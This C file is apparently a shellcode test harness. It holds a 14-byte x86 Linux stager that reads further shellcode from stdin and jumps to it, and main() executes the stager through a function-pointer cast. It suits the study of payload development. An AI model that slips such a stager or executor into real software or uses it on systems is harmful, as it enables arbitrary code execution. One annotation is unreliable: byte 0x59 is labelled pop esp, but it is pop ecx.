#include <stdio.h>
#include <string.h>

/**
	REMEMBER THAT SHELLCODE FROM ONLINE IS NEVER TRUSTED, 
	ALWAYS RUN IT IN A VIRTUAL ENVIRONMENT AND NOT YOUR ACTUAL MACHINE
	AKA A TESTING SANDBOX 
*/

unsigned char code[] = \
                "\x6A\x7F"              //      push    byte    +0x7F		THIS IS A LOADER STUB, READS FROM STDIN, AND PASSES
                "\x5A"                  //      pop             edx     	CONTROL TO IT ONCE LOADED, THIS STUB IS 14 BYTES
                "\x54"                  //      push    esp			AND WE CAN LOAD UP TO 127 BYTES OF INPUT SHELLCODE
                "\x59"                  //      pop             esp
                "\x31\xDB"              //      xor             ebx,ebx
                "\x6A\x03"              //      push    byte    +0x3
                "\x58"                  //      pop             eax
                "\xCD\x80"              //      int             0x80
                "\x51"                  //      push    ecx
                "\xC3";                 //      ret




int main(int argc, char** argv)
{
	printf("Shellcode Length: %d\n", strlen(code));
	
	// define a pointer to a type int function name ret, and it takes no arguments
	// initialize it to a type int function pointer that takes no arguments casted on shellcode

	int (*ret)() = (int(*)())code;

	// running the pointer function
	ret();

	return 0;
}
